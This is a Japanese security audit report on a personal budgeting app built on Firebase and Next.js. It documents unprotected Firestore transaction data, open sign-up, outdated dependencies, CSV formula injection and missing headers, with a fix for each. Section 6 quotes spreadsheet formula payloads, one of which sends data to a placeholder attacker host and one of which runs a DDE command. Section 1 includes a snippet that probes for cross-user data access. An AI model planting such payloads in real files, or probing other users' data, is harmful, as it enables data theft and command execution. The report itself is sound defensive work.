# セキュリティ脆弱性調査レポート

対象: kakeibo-app v5.0.0 / 調査日: 2026-08-09
対象コミット: `529b698`（`main` 相当）
調査範囲: リポジトリ内の全ソース（`src/`, `public/`, 設定ファイル, ドキュメント）、依存関係（`package-lock.json`）、Git 履歴

> **注意**: 本調査はリポジトリの静的解析のみで実施した。Firebase Console 側の実設定（Firestore セキュリティルール、Authentication 設定）は参照できていないため、それらに関する指摘は「リポジトリの記述から推定される状態」に基づく。**特に指摘 #1 は本番環境の実ルールの確認が必須。**

---

## サマリ

| # | 深刻度 | 指摘 | 該当箇所 |
|---|--------|------|----------|
| 1 | **Critical** | `transactions` コレクションがドキュメント記載のセキュリティルールで保護されていない（全ユーザーの家計データが他人から読み書き可能な可能性） | `src/contexts/TransactionsContext.tsx` / `docs/deployment.md` |
| 2 | **High** | 誰でもアカウント登録できる（オープンサインアップ）。#1 の攻撃前提条件になる | `src/components/ui/LoginForm.tsx` |
| 3 | **High** | Firestore セキュリティルールがバージョン管理外（Markdown 内のサンプルのみ）。レビュー・再現・CI 検証が不可能 | リポジトリ全体（`firestore.rules` 不在） |
| 4 | **High** | `next` 16.1.1 に多数の既知脆弱性（Middleware バイパス、SSRF、DoS、XSS 等） | `package.json` |
| 5 | **Medium** | 取引の更新・削除に所有者チェックが一切ない（クライアント／ルール双方） | `src/contexts/TransactionsContext.tsx:194-215` |
| 6 | **Medium** | CSV インジェクション（数式インジェクション）— エクスポート CSV に数式が混入しうる | `src/utils/csvUtils.ts:5-9` |
| 7 | **Medium** | セキュリティヘッダ未設定（CSP / X-Frame-Options / HSTS / Referrer-Policy / X-Content-Type-Options） | `next.config.ts` |
| 8 | **Low** | アカウント列挙が可能なエラーメッセージ | `src/components/ui/LoginForm.tsx:20-24` |
| 9 | **Low** | `next.config.ts` の `env.CUSTOM_KEY` が任意の値をクライアントバンドルへインライン展開する | `next.config.ts:19-21` |
| 10 | **Low** | CSV インポートの入力検証不足・件数無制限 | `src/utils/csvUtils.ts:79-108` |
| 11 | **Low** | ログアウト時に Service Worker キャッシュが残存する | `public/sw.js` |
| 12 | **Low** | メールアドレス未確認でも利用可能／パスワード最小 6 文字 | `src/components/ui/LoginForm.tsx:74-76` |
| 13 | Info | ビルドツールチェーン等の推移的依存に既知脆弱性（多くは本アプリでは非該当） | `package-lock.json` |

`npm audit` 集計: **17 件（critical 3 / high 11 / moderate 2 / low 1）**

---

## 1. 【Critical】`transactions` コレクションがセキュリティルールで保護されていない

### 事象

アプリが使用する Firestore のパスは 2 系統に分かれている。

| データ | パス | ソース |
|--------|------|--------|
| ユーザー設定 | `users/{uid}/settings/app` | `src/contexts/SettingsContext.tsx:53` |
| 定期取引 | `users/{uid}/recurringTransactions/{id}` | `src/hooks/useRecurringTransactions.ts:31,70,86,96` |
| **取引（本体データ）** | **`/transactions/{id}`（トップレベル）** | `src/contexts/TransactionsContext.tsx:115,179,198,212` |

一方、`docs/deployment.md:31-41` に「必須設定」として記載されているセキュリティルールは以下のみ:

```javascript
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /users/{userId}/{document=**} {
      allow read, write: if request.auth != null && request.auth.uid == userId;
    }
  }
}
```

このルールは `/users/**` しかマッチしない。**アプリの中核データである取引はトップレベルの `/transactions/{id}` に保存されており、このルールの保護対象外**である。`.kiro/specs/recurring-transactions/design.md:225` にも `users/{userId}/recurringTransactions` のルールしか記載がなく、リポジトリ内のどこにも `/transactions` に対するルールの記述が存在しない。

### 原因

**データモデルの移行が中途半端なまま放置されている。** 設定と定期取引は後発機能としてユーザー配下のサブコレクションに正しく配置された（`ab9fe91` で `SettingsContext` 追加）一方、初期実装から存在する取引コレクションだけがトップレベルの `where('userId', '==', uid)` フィルタ方式のまま残った。そしてドキュメントのルールは新しい `users/**` 構造だけを見て書かれており、古い `transactions` を取りこぼしている。

根本的には **指摘 #3（ルールがコード管理外）が原因**で、「コードが参照するパス」と「ルールが保護するパス」の突き合わせが誰にも検証されていない。

### 影響

Firestore のルールは「マッチしないパスはデフォルト拒否」であるため、ドキュメント通りのルールが適用されていれば取引の読み書きは**全て失敗する**。しかしアプリは本番稼働しており（v5.0.0 / Vercel 自動デプロイ）取引機能が動いているため、**実際に適用されているルールはドキュメントより広い**と考えられる。想定される実態と影響:

| 実ルールの想定 | 影響 |
|---|---|
| `match /{document=**} { allow read, write: if request.auth != null; }` | **最も可能性が高い。ログインさえすれば任意のユーザーが全ユーザーの取引を読み書き・削除できる（水平権限昇格 / IDOR）。** 指摘 #2 により誰でもアカウントを作れるため、実質「インターネット上の誰でも全ユーザーの家計データを閲覧・改ざん可能」 |
| テストモード（`allow read, write: if true`）| 認証すら不要で全データが公開（テストモードは通常 30 日で失効するため、失効後はアプリが動かなくなる。稼働中なら該当しない可能性が高い） |
| 未文書の `/transactions` 用ルールが別途存在 | 実害はないが、ドキュメントが誤りであり #3 の問題は残る |

漏洩する情報は、収支の全履歴・金額・カテゴリ・メモ・利用クレジットカード名・月間予算といった**極めてセンシティブな個人金融情報**である。

### 確認方法

Firebase Console → Firestore Database → ルール で現行ルールを確認する。加えて実地検証:

```bash
# 別アカウント B でログインした状態のブラウザコンソールで実行し、
# A のデータが読めてしまわないか確認する
const snap = await getDocs(query(collection(db,'transactions'), where('userId','==','<他人のUID>')));
console.log(snap.size);   // 0 以外が返れば水平権限昇格が成立している
```

### 対応方法

**即時対応（優先度最高）**: `/transactions` に所有者チェックを含むルールを適用する。あわせて末尾に明示的な全拒否を置き、未定義パスが将来も暗黙に開かないようにする。

`firestore.rules`（新規作成、リポジトリ管理下に置く）:

```javascript
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {

    function isSignedIn() {
      return request.auth != null;
    }
    function isOwner(userId) {
      return isSignedIn() && request.auth.uid == userId;
    }

    // 設定・定期取引（ユーザー配下サブツリー）
    match /users/{userId}/{document=**} {
      allow read, write: if isOwner(userId);
    }

    // 取引（トップレベル。userId フィールドが所有者を表す）
    match /transactions/{transactionId} {
      function isValid(data) {
        return data.userId is string
            && data.type in ['income', 'expense']
            && data.amount is number
            && data.amount >= 0 && data.amount <= 1000000000
            && data.category is string && data.category.size() <= 100
            && data.date is timestamp;
      }

      // list は クエリが userId で絞られている場合のみ許可される
      allow get, list: if isSignedIn() && resource.data.userId == request.auth.uid;
      allow create:    if isSignedIn()
                       && request.resource.data.userId == request.auth.uid
                       && isValid(request.resource.data);
      allow update:    if isSignedIn()
                       && resource.data.userId == request.auth.uid
                       && request.resource.data.userId == resource.data.userId  // 所有者の付け替え禁止
                       && isValid(request.resource.data);
      allow delete:    if isSignedIn() && resource.data.userId == request.auth.uid;
    }

    // 上記以外は全拒否（デフォルト拒否を明示）
    match /{document=**} {
      allow read, write: if false;
    }
  }
}
```

`allow list` の条件はクエリに `where('userId','==',uid)` が含まれている必要があるが、`TransactionsContext.tsx:113-119` および `SettingsContext.tsx:185-192` のクエリは既にこの条件を満たしているためアプリ側の変更は不要。

**中期対応**: 取引も `users/{uid}/transactions/{id}` へ移行し、データモデルを一本化する。所有権がパスで表現されるためルールが単純化し、同種の取りこぼしが構造的に起きなくなる。移行は「二重書き込み → バックフィル → 読み取り切替 → 旧コレクション削除」の順で行う。

---

## 2. 【High】誰でもアカウントを登録できる

### 事象

`src/components/ui/LoginForm.tsx:107` でログイン画面から `createUserWithEmailAndPassword` を無制限に呼べる。招待制・許可リスト・reCAPTCHA 等の制限は一切ない。

### 原因

`README.md` / `docs/deployment.md` が示す通り本アプリは**個人用途**（"個人用途なので Private 推奨"）だが、実装は汎用的なパブリック SaaS と同じオープンサインアップになっている。用途と認証設計が乖離している。

### 影響

単体では「不要なアカウントが作られる」程度だが、**指摘 #1 と組み合わさると致命的**になる。ルールが `request.auth != null` ベースであれば、攻撃者は 30 秒で自分のアカウントを作り、その資格情報で全ユーザーの家計データにアクセスできる。「認証済みユーザーのみ」という防御が実質「誰でも」に劣化する。

### 対応方法

1. **Firebase Console → Authentication → Settings → User actions で「ユーザー アカウントの作成（登録）」を無効化する。** これがサーバー側で強制される唯一の対策。
2. UI の「新規登録」ボタン（`LoginForm.tsx:220-227`）を削除するのは補助的措置に過ぎない。**UI を消しても Firebase の API は直接叩けるため、1 を必ず併用すること。**
3. 複数人利用に拡張する予定があるなら、Identity Platform の Blocking Function（`beforeCreate`）で許可メールドメイン／許可リストを検証する方式にする。

---

## 3. 【High】Firestore セキュリティルールがバージョン管理外

### 事象

リポジトリに `firestore.rules` が存在せず、`firebase.json` にも `firestore` セクションがない（emulators 設定のみ）。ルールは `docs/deployment.md` と `.kiro/specs/**/design.md` の Markdown コードブロックとしてしか存在しない。

### 原因

Firebase の初期設定を Console の GUI で行い、`firebase init firestore` によるルールのコード化を行わなかったため。

### 影響

- ルールの変更が PR レビューを経ない（指摘 #1 の見落としが起きた直接の原因）
- 実環境のルールと文書が乖離しても検知できない
- ルールのユニットテスト（`@firebase/rules-unit-testing`）が書けない
- 誤操作でルールを緩めた場合にロールバックできない

### 対応方法

1. リポジトリ直下に `firestore.rules`（内容は指摘 #1 参照）と `firestore.indexes.json` を追加する。
2. `firebase.json` にルールを登録する:

```json
{
  "firestore": {
    "rules": "firestore.rules",
    "indexes": "firestore.indexes.json"
  },
  "emulators": {
    "auth": { "port": 9099 },
    "firestore": { "port": 8080 },
    "ui": { "enabled": false },
    "singleProjectMode": true
  }
}
```

3. `firebase deploy --only firestore:rules` をデプロイ手順に組み込み、`docs/deployment.md` を「Console で手入力」から書き換える。
4. `@firebase/rules-unit-testing` でエミュレータ上のルールテストを追加し、最低限「他人の UID の取引が読めない／書けない／消せない」ケースを固定する。現状テストスイートが無いため、これが最初のテストになる。

---

## 4. 【High】`next` 16.1.1 に多数の既知脆弱性

### 事象

`package.json` は `"next": "^16.1.1"` を指定し、`package-lock.json` は 16.1.1 に固定されている。`npm audit` が本パッケージだけで 31 件の勧告を報告する。

### 影響が実際にありうるもの（App Router / Vercel ホスティング環境）

| 勧告 | CVSS | 影響 |
|------|------|------|
| GHSA-492v-c6pp-mqqv — Middleware / Proxy bypass（動的ルートパラメータ注入） | 8.1 | `<16.2.5` |
| GHSA-26hh-7cqf-hhc6 / GHSA-267c-6grr-h53f — segment-prefetch 経由の Middleware バイパス | 7.5 | `<16.2.6` |
| GHSA-ffhc-5mcf-pf4q — **CSP nonce 使用時の XSS** | 4.7 | `<16.2.5`（指摘 #7 で CSP を導入する際に直撃する） |
| GHSA-vfv6-92ff-j949 / GHSA-wfc6-r584-vfw7 / GHSA-3g8h-86w9-wvmq — RSC レスポンスのキャッシュポイズニング | 3.7–5.4 | `<16.2.5` |
| GHSA-8h8q-6873-q5fj / GHSA-q4gf-8mx6-v5v3 — Server Components 経由の DoS | 7.5 | `<16.2.5` |
| GHSA-955p-x3mx-jcvp — Server Function エンドポイントの未認証開示 | — | `<16.2.11` |

### 非該当と判断したもの（過剰対応を避けるため明記）

- **Image Optimization 系**（GHSA-h64f-5h5j-jqjh, GHSA-q8wf-6r8g-63ch, GHSA-3x4c-7xq6-9pq8, および `sharp` の GHSA）: 本アプリは `next/image` を一切使用していない（`src/` に `next/image` の import なし）。
- **Server Actions / 独自サーバ系**（GHSA-mq59-m269-xvcx, GHSA-89xv-2m56-2m9x 等）: Server Actions 未使用、Vercel マネージドホスティングのため。
- **Pages Router / i18n 系**（GHSA-36qx-fr4f-26g5）: App Router のみ使用。

ただし Middleware バイパス系は「現状 middleware を使っていないから安全」ではなく、**将来 middleware を追加した瞬間に認可バイパスになる**性質のため、非該当扱いにはしない。

### 対応方法

```bash
npm install next@^16.2.11 eslint-config-next@^16.2.11
npm run type-check && npm run lint && npm run build
```

`16.2.11` 以降が現時点で全勧告を解消する最小バージョン。Next.js のメジャー内マイナー更新は破壊的変更を含みうるため、更新後に `npm run build` とプレビューデプロイでの動作確認（ログイン・取引 CRUD・チャート・CSV 入出力）を必ず行う。

---

## 5. 【Medium】取引の更新・削除に所有者チェックがない

### 事象

`src/contexts/TransactionsContext.tsx:194-215`:

```typescript
const updateTransaction = useCallback(async (id: string, updates: Partial<Transaction>) => {
  if (!user) return;                              // ← ログイン確認のみ
  await updateDoc(doc(db, 'transactions', id), updateData);   // ← id の所有者を検証していない
}, [user]);

const deleteTransaction = useCallback(async (id: string) => {
  if (!user) return;                              // ← 同上
  await deleteDoc(doc(db, 'transactions', id));
}, [user]);
```

任意のドキュメント ID に対して更新・削除が実行できる。`addTransaction` は `userId: user.uid` を付与しているが、更新・削除の経路には所有者の検証が存在しない。

### 原因

`where('userId','==',uid)` で絞ったリストからしか ID が渡らない、という**画面遷移上の前提に依存**した実装になっている。ID は推測・列挙可能な値であり、コンテキストの mutation メソッドは直接呼び出せるため、この前提は防御にならない。

### 影響

クライアント側のチェックはそもそも防御にならないので、実質的な影響は**サーバー側（Firestore ルール）に所有者チェックがあるか**に完全に依存する。指摘 #1 のルールが `request.auth != null` だけであれば、他人の取引 ID を 1 つ知る（または総当たりする）だけで**改ざん・削除が可能**になる。

### 対応方法

1. **本質的な対策はルール側**。指摘 #1 の `firestore.rules` に含めた `resource.data.userId == request.auth.uid`（update / delete）および `request.resource.data.userId == resource.data.userId`（所有者付け替えの禁止）がこれに当たる。**これを最優先で入れること。**
2. 補助的に、クライアント側でも早期に弾いて誤操作と不要な失敗リクエストを防ぐ:

```typescript
const deleteTransaction = useCallback(async (id: string) => {
  if (!user) return;
  const target = transactions.find(t => t.id === id);
  if (!target || target.userId !== user.uid) {
    throw new Error('操作対象の取引が見つかりません');
  }
  await deleteDoc(doc(db, 'transactions', id));
}, [user, transactions]);
```

---

## 6. 【Medium】CSV インジェクション（数式インジェクション）

### 事象

`src/utils/csvUtils.ts:5-9`:

```typescript
const escapeCSVField = (field: string | number): string => {
  const str = String(field);
  return `"${str.replace(/"/g, '""')}"`;
};
```

RFC 4180 のクォート処理は正しいが、**表計算ソフトの数式解釈に対する無害化がない**。

### 原因

「CSV として壊れないこと」（RFC 4180 準拠）と「表計算ソフトで安全に開けること」を同一視している。ダブルクォートで囲んでも Excel / Google Sheets / LibreOffice は先頭の `=` `+` `-` `@` を数式として評価するため、クォートは対策にならない。

### 影響

メモ欄（`description`）やカテゴリ名に `=HYPERLINK("https://evil.example/?d="&A1&B1,"クリック")` のような文字列が入った状態でエクスポートし、その CSV を Excel で開くと数式が評価される。`=cmd|'/c calc'!A1`（DDE）形式では警告ダイアログを経てコマンド実行に至る場合もある。

本アプリは個人用途でメモは自分で入力するため単独では悪用しにくいが、**指摘 #1 が成立している場合、攻撃者が他人の取引レコードに数式ペイロードを書き込み、被害者がエクスポートして開いた時点で発火する**という現実的な連鎖が成り立つ。CSV インポート経路（他人から受け取った CSV を取り込む）でも同様。

### 対応方法

`src/utils/csvUtils.ts`:

```typescript
// 表計算ソフトが数式として解釈する先頭文字を無害化する（OWASP CSV Injection 対策）。
// クォートで囲むだけでは Excel / Sheets の数式評価は防げない。
const FORMULA_TRIGGER = /^[=+\-@\t\r]/;

const escapeCSVField = (field: string | number): string => {
  // 金額など数値型は数式トリガにならないためそのまま扱う
  if (typeof field === 'number') {
    return `"${field}"`;
  }
  const str = FORMULA_TRIGGER.test(field) ? `'${field}` : field;
  return `"${str.replace(/"/g, '""')}"`;
};
```

エクスポート→インポートの往復で `'` が残らないよう、`parseCSV` 側で先頭の `'` を剥がす:

```typescript
const unescapeCSVField = (value: string): string =>
  FORMULA_TRIGGER.test(value.slice(1)) && value.startsWith("'") ? value.slice(1) : value;
```

---

## 7. 【Medium】セキュリティヘッダが設定されていない

### 事象

`next.config.ts:29-52` の `headers()` は `/sw.js` と `/manifest.json` の `Cache-Control` しか設定していない。CSP、`X-Frame-Options`、`Strict-Transport-Security`、`Referrer-Policy`、`X-Content-Type-Options`、`Permissions-Policy` がいずれも未設定。

### 原因

`headers()` が PWA のキャッシュ制御という単一目的で導入され、セキュリティヘッダの観点が検討されていない。

### 影響

- **クリックジャッキング**: `frame-ancestors` / `X-Frame-Options` がないため、攻撃者のページに iframe で埋め込み、取引の削除ボタン等を誤クリックさせられる。
- **XSS の被害拡大**: CSP がないため、万一 XSS が成立した場合にデータの外部送信を止める層がない。金融データを扱うアプリとして層が薄い。
- **MIME スニッフィング**: `nosniff` がなく、アップロード系機能を将来追加した際のリスクが残る。
- **Referrer 漏洩**: `?month=YYYY-MM` 程度なので実害は小さいが、外部リンク追加時に URL が漏れる。

### 対応方法

`next.config.ts` の `headers()` に全ルート向けエントリを追加する:

```typescript
async headers() {
  return [
    {
      source: '/:path*',
      headers: [
        { key: 'X-Frame-Options', value: 'DENY' },
        { key: 'X-Content-Type-Options', value: 'nosniff' },
        { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=(), payment=()' },
        { key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains; preload' },
        {
          key: 'Content-Security-Policy',
          value: [
            "default-src 'self'",
            // Next.js のインラインブートストラップと Mantine の inline style に必要
            "script-src 'self' 'unsafe-inline' https://apis.google.com",
            "style-src 'self' 'unsafe-inline'",
            "img-src 'self' data: blob:",
            "font-src 'self' data:",  // next/font/google はビルド時にセルフホストされる
            "connect-src 'self' https://firestore.googleapis.com https://identitytoolkit.googleapis.com https://securetoken.googleapis.com https://*.googleapis.com",
            "frame-src 'self' https://*.firebaseapp.com",
            "frame-ancestors 'none'",
            "base-uri 'self'",
            "form-action 'self'",
            "object-src 'none'",
          ].join('; '),
        },
      ],
    },
    // 既存の /sw.js, /manifest.json エントリはそのまま残す
  ];
}
```

**導入順序の注意**: nonce ベースの CSP を採用する場合は、**先に指摘 #4 の Next.js 更新を済ませること**。16.2.5 未満には CSP nonce 使用時の XSS（GHSA-ffhc-5mcf-pf4q）があり、CSP を入れたことで新たな脆弱性を踏む。上記は nonce を使わない `'unsafe-inline'` 版なので直接は該当しないが、いずれ nonce 化するなら更新が前提になる。

導入後は Chrome DevTools の Console で CSP 違反が出ないこと（特に Firestore の WebChannel 接続と Mantine のスタイル注入）を確認する。まず `Content-Security-Policy-Report-Only` で 1 デプロイ様子を見るのが安全。

---

## 8. 【Low】アカウント列挙が可能なエラーメッセージ

### 事象

`src/components/ui/LoginForm.tsx:20-24`:

```typescript
'auth/email-already-in-use': 'このメールアドレスは既に登録されています。ログインをお試しください。',
'auth/user-not-found':       'このメールアドレスは登録されていません。新規登録をお試しください。',
'auth/wrong-password':       'パスワードが正しくありません。',
```

登録の有無・パスワードの正誤を区別してユーザーに提示している。

### 原因

UX（親切なエラー表示）を優先した結果、認証結果のオラクルになっている。

### 影響

任意のメールアドレスについて「このサービスに登録しているか」を判定できる。家計簿という用途上、利用事実自体が個人情報になりうる。ただし Firebase の Email Enumeration Protection（新規プロジェクトでは既定有効）が有効なら、Firebase 側が `auth/invalid-credential` に統一するため `user-not-found` / `wrong-password` は実際には返らない。**指摘 #2 のオープンサインアップと組み合わさると、登録試行による列挙は防げない点に注意。**

### 対応方法

1. Firebase Console → Authentication → Settings で **Email enumeration protection を有効**にする（サーバー側の統一が本質的な対策）。
2. クライアント側でも `auth/user-not-found` / `auth/wrong-password` を個別表示せず、`auth/invalid-credential` と同じ「メールアドレスまたはパスワードが正しくありません」に寄せる。
3. `auth/email-already-in-use` は指摘 #2 でサインアップ自体を無効化すれば発生経路がなくなる。

---

## 9. 【Low】`env.CUSTOM_KEY` によるクライアントバンドルへの露出

### 事象

`next.config.ts:19-21`:

```typescript
env: {
  CUSTOM_KEY: process.env.CUSTOM_KEY,
},
```

### 原因

`create-next-app` 系のテンプレート／サンプル設定が残置されたもの。`CUSTOM_KEY` はコード中のどこからも参照されていない（`src/` に該当なし）。

### 影響

Next.js の `env` オプションは**指定した値を `NEXT_PUBLIC_` の有無に関わらずクライアントバンドルへインライン展開する**。現状は未定義なので実害はないが、将来誰かが Vercel の環境変数に `CUSTOM_KEY` として API キーやシークレットを設定した瞬間、それが公開 JS バンドルに埋め込まれる。「`NEXT_PUBLIC_` を付けなければ秘匿される」という一般的な理解に反する挙動なので、罠として残しておくべきではない。

### 対応方法

未使用なので、`next.config.ts` から `env` ブロックごと削除する。将来クライアントに露出してよい値が必要になったら `NEXT_PUBLIC_` プレフィックスで定義する（挙動が名前から自明になる）。

---

## 10. 【Low】CSV インポートの入力検証不足

### 事象

`src/utils/csvUtils.ts:79-108`:

- `category` / `subcategory` / `paymentMethod` / `description` が**ユーザー設定に存在するかを検証せず、長さ上限もなく**そのまま Firestore へ書き込まれる
- `amount: parseInt(fields[4], 10)` — `"1e5"` が `1` に、`"100abc"` が `100` になる（サイレントなデータ破損）
- 取り込み件数に上限がない。`CSVImportExport.tsx:60-68` が `addDoc` を 1 件ずつ直列に実行するため、10 万行の CSV は 10 万回の書き込みになる

### 原因

インポート元を「自アプリがエクスポートした信頼できる CSV」と想定している。実際にはユーザーが任意のファイルを選択できる。

### 影響

- データ整合性の破壊（未知カテゴリの混入により集計ルール `deriveTransactionFlags` のフォールバック分岐に落ち、投資・立替金の除外が意図通り効かなくなる）
- 巨大 CSV による Firestore 書き込み課金の増大とブラウザのハングアップ（自己 DoS）
- 極端に長い文字列の保存（Firestore の 1MB/doc 上限まで）

### 対応方法

```typescript
const MAX_IMPORT_ROWS = 5000;
const MAX_FIELD_LENGTH = 200;

export const parseCSV = (csvText: string, rules: TransactionRules): TransactionInput[] => {
  const lines = csvText.replace(/^\uFEFF/, '').split(/\r?\n/).filter(l => l.trim());
  const dataLines = lines.slice(1, MAX_IMPORT_ROWS + 1);   // 件数上限

  return dataLines.map(/* ... */).filter(t =>
    !isNaN(t.date.getTime()) &&
    Number.isSafeInteger(t.amount) &&            // parseInt の取りこぼしを弾く
    t.amount > 0 && t.amount <= 1_000_000_000 &&
    !!t.category && t.category.length <= MAX_FIELD_LENGTH &&
    (t.description ?? '').length <= MAX_FIELD_LENGTH
  );
};
```

あわせて `CSVImportExport.tsx` の直列 `addDoc` ループを `writeBatch`（500 件ずつ）に置き換えると、書き込み回数と失敗時の一貫性が改善する。件数上限を超えた場合はユーザーに通知する。

なお、上限値の最終的な担保は**サーバー側（指摘 #1 のルール内 `isValid()`）**で行うこと。クライアント側の検証だけでは迂回できる。

---

## 11. 【Low】ログアウト時に Service Worker キャッシュが残存する

### 事象

`public/sw.js` はナビゲーションレスポンス（`/` を含むアプリシェル）と静的アセットを Cache Storage に保存する。`AuthContext.tsx:44` の `logout` は `signOut(auth)` のみで、キャッシュのクリアも SW の解除も行わない。

### 原因

SW がキャッシュ戦略の観点だけで設計され、認証状態のライフサイクルと結び付いていない。

### 影響

限定的。`shouldBypass()` が Firebase / Firestore へのリクエストを除外しているため、**取引データそのものはキャッシュされない**（アプリは完全クライアントレンダリングで、HTML にデータは含まれない）。残るのはアプリシェルと静的アセットのみ。共用端末でログアウト後もアプリの外枠がオフライン表示される、という程度に留まる。

### 対応方法

厳密を期すなら `AuthContext` の `logout` でキャッシュを破棄する:

```typescript
logout: async () => {
  await signOut(auth);
  if ('caches' in window) {
    const keys = await caches.keys();
    await Promise.all(keys.map(k => caches.delete(k)));
  }
},
```

現状のリスクは低いため、他の指摘を片付けた後の対応で差し支えない。

---

## 12. 【Low】メールアドレス未確認での利用／弱いパスワードポリシー

### 事象

- `LoginForm.tsx:104-110` — `createUserWithEmailAndPassword` 後に `sendEmailVerification` を呼んでおらず、`user.emailVerified` もどこでも参照していない。未確認のメールアドレスでそのまま全機能が使える。
- `LoginForm.tsx:75` — `password: (value) => (value.length < 6 ? ... : null)` — Firebase 既定の最小 6 文字のみ。複雑性要件・漏洩パスワードチェックなし。

### 影響

他人のメールアドレスでのアカウント作成、および総当たり耐性の低下。Firebase 側のレート制限（`auth/too-many-requests`）はあるため単独での深刻度は低い。

### 対応方法

指摘 #2 でサインアップを無効化すれば、両方とも発生経路がなくなる（**これが最も簡潔な対処**）。将来複数人で使うなら:

- 登録後に `sendEmailVerification()` を送り、Firestore ルールで `request.auth.token.email_verified == true` を要求する
- Firebase Console → Authentication → Settings → Password policy で最小 8 文字＋文字種要件を設定する

---

## 13. 【Info】推移的依存の既知脆弱性

`npm audit` の 17 件のうち、`next` 以外はすべて推移的依存。実際の露出を評価すると:

| パッケージ | 深刻度 | 経路 | 評価 |
|---|---|---|---|
| `tar` <=7.5.20 | critical | `@tailwindcss/oxide` (devDependency) | **ビルド時のみ**。信頼できないアーカイブを展開しないため実害なし |
| `protobufjs` <=7.6.4 | critical | `@firebase/firestore` → `@grpc/proto-loader` | Firestore の **Node ビルド専用**。本アプリは全画面がクライアントコンポーネントでブラウザバンドルに含まれないため非該当 |
| `@grpc/grpc-js` <1.9.16 | high | `@firebase/firestore` | 同上（Node ビルド専用、サーバ側 Firestore 未使用） |
| `websocket-driver` <=0.7.4 | critical | `@firebase/database` → `faye-websocket` | **Realtime Database 未使用**のため非該当 |
| `sharp` <0.35.0 | high | `next`（optional） | `next/image` 未使用のため非該当 |
| `postcss` / `nanoid` / `lodash` / `js-yaml` / `minimatch` / `brace-expansion` / `picomatch` / `flatted` / `ajv` / `@babel/core` | low–high | ビルド・Lint ツールチェーン | ビルド時のみ。信頼できない入力を処理しないため実害は限定的 |

### 対応方法

```bash
npm audit fix          # 破壊的変更なしで解消できるものを更新
npm run type-check && npm run lint && npm run build
```

実害は限定的だが、`package-lock.json` を最新に保つこと自体に価値がある（将来サーバーサイド処理を追加した際に「非該当」の前提が崩れるため）。`npm audit fix --force` は Next.js のメジャー変更を巻き込む可能性があるので使わないこと。

---

## 良好だった点

公平を期すため、確認した結果**問題がなかった**項目も記載する。

- **秘密情報の漏洩なし**: Git 履歴全体を走査したが、`.env` 系ファイルのコミットも Firebase API キー（`AIza...` パターン）のハードコードも一切なかった。`.gitignore` の `.env*` / `!.env.example` は適切。
- **XSS の直接的な注入点なし**: `dangerouslySetInnerHTML`、`innerHTML`、`eval`、`new Function` の使用はゼロ。React と Mantine の既定のエスケープに依存できている。
- **`localStorage` の使い方が適切**: 保存しているのは PWA プロンプトの再表示抑止タイムスタンプ（`pwa-dismissed`）のみで、認証トークンや個人データを自前保存していない。
- **オープンリダイレクトなし**: `router.push` の遷移先はすべて静的文字列またはアプリ内クエリ（`?month=...`）で、URL パラメータをそのまま遷移先に使う箇所がない。
- **CSV パーサ自体は堅牢**: `parseCSVLine` はクォート・エスケープ・改行を正しく扱い、BOM と CRLF にも対応している（数式の無害化だけが欠けている）。
- **TypeScript strict モード有効**、`ignoreBuildErrors: false` でビルド時の型チェックを迂回していない。
- **Service Worker が Firebase リクエストを明示的にキャッシュ除外**しており、認証情報や取引データがキャッシュに落ちない設計になっている。

---

## 推奨対応ロードマップ

### フェーズ 1 — 即時（本番稼働中のデータ露出を止める）

1. **Firebase Console で現行の Firestore ルールを確認する**（#1）— まずこれ。実態が判明するまで他の判断ができない
2. ルールが `request.auth != null` ベースだった場合、**指摘 #1 の `firestore.rules` を即座に適用**（#1, #5, #10 のサーバー側担保を同時に解決）
3. **Authentication でユーザー登録を無効化**（#2）— Console 操作のみ、数分で完了
4. Email enumeration protection を有効化（#8）

> 1–4 はすべて Firebase Console 側の操作で、コード変更もデプロイも不要。最短で防御できる。

### フェーズ 2 — 短期（1 週間以内 / コード変更）

5. `firestore.rules` + `firestore.indexes.json` をリポジトリに追加し `firebase.json` へ登録（#3）
6. `next` を `^16.2.11` へ更新（#4）
7. セキュリティヘッダを追加（#7）— **必ず 6 の後に**
8. CSV の数式インジェクション対策（#6）
9. `next.config.ts` の `env` ブロック削除（#9）
10. `npm audit fix`（#13）

### フェーズ 3 — 中期（再発防止）

11. `@firebase/rules-unit-testing` によるルールのテストを追加（#3）— 「他人の UID のデータに触れない」ケースを固定
12. CSV インポートの入力検証・件数上限・`writeBatch` 化（#10）
13. 取引を `users/{uid}/transactions/{id}` へ移行しデータモデルを一本化（#1 中期対応）
14. クライアント側の所有者チェック追加（#5）、ログアウト時のキャッシュクリア（#11）

---

## 付録: 調査手法

- 全ソースファイルの読解（`src/` 配下 40 ファイル、`public/sw.js`、各種設定ファイル）
- Firestore アクセスパスの全列挙（`grep -rn "collection(db\|doc(db" src/`）とセキュリティルール記述との突き合わせ
- XSS / インジェクション / ストレージ利用パターンの検索（`dangerouslySetInnerHTML`, `innerHTML`, `eval`, `new Function`, `localStorage`, `document.cookie`, `window.location`）
- Git 全履歴に対する秘密情報スキャン（`.env` 系ファイルの追加履歴、`AIza[0-9A-Za-z_-]{35}` パターン）
- `npm audit` の全勧告を精査し、`package-lock.json` の依存グラフから各パッケージの経路（prod / dev / optional）と実際の露出有無を判定
